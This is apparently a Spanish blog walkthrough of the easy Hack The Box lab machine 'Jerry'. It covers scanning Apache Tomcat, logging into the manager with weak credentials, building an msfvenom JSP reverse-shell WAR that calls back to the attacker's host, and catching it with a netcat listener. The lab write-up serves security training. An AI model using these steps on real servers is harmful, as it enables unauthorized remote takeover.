---
title: "Jerry - WriteUp"
date: Sun Jun 30 2024 22:00:00 GMT+0200 (Central European Summer Time)
categories: [WriteUps, HTB, Windows]
tags: [ctf, nmap, htb, msfvenom, windows, apache, tomcat, bash]
image: /assets/img/htb-writeups/Pasted image 20240219180022.png
---

{% include machine-info.html
  machine="Jerry"
  os="Windows"
  difficulty="Easy"
  platform="HTB"
%}

![Jerry](/assets/img/htb-writeups/Pasted image 20240219180022.png)

Tags:     

------

![JERRY](/assets/img/htb-writeups/Pasted image 20240219180022.png)

Aunque Jerry es una de las máquinas más sencillas de Hack The Box, es realista ya que Apache Tomcat a menudo se encuentra expuesto y configurado con credenciales comunes o débiles.

-----

#### ENUM

NMAP
```bash
# Nmap 7.94SVN scan initiated Mon Feb 19 18:27:44 2024 as: nmap -sCV -p 8080 --stylesheet=https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/stable/nmap-bootstrap.
xsl -oN targeted -oX targetedXML 10.129.136.9
Nmap scan report for 10.129.136.9
Host is up (0.043s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/7.0.88
| http-vulners-regex: 
|   /base.cfm: 
|     cpe:/a:apache:tomcat:7.0.88
|_    cpe:/a:apache:tomcat:1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
```

HTTP puerto 8080

![JERRY](/assets/img/htb-writeups/Pasted image 20240219183148.png)

WHATWEB

```BASH
$ whatweb -v http://10.129.136.9:8080
```

![JERRY](/assets/img/htb-writeups/Pasted image 20240219191426.png)

Nos vamos a la ruta típica de TomCat

```http
http://10.129.136.9:8080/manager/html
```

![JERRY](/assets/img/htb-writeups/Pasted image 20240219192754.png)

Probamos las típicas credenciales por defecto como admin/admin y nos arroja este mensaje de error:

![JERRY](/assets/img/htb-writeups/Pasted image 20240219192934.png)

Si nos fijamos nos aparecen unas credenciales parecidas a las que suelen venir por defecto pero un poco modificadas, vamos a probarlas:

```http
tomcat:s3cret
```

Y entramos:

![JERRY](/assets/img/htb-writeups/Pasted image 20240219193228.png)

Ahora lo que nos hace falta es ganar acceso a la máquina a través de un archivo _.war_ malicioso que podremos crear con _msfvenom_:

```bash
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.131 LPORT=443 -f war -o shell.war
```

Una vez creado nos vamos a la sección "WAR file to deploy" y subimos el .war malicioso:

![JERRY](/assets/img/htb-writeups/Pasted image 20240219193740.png)

Nos ponemos en escucha por el puerto que hayamos configurado en el payload y pulsaremos sobre el enlace shell que se ha creado:

![JERRY](/assets/img/htb-writeups/Pasted image 20240219193945.png)

```bash
$ rlwrap nc -nlvp 443
```

Y entraremos directamente como administrador del sistema.

Registramos las dos banderas y pa casa...
---

**Última actualización**: 2024-06-30<br>
**Autor**: A. Lorente<br>
**Licencia**: Creative Commons BY-NC-SA 4.0
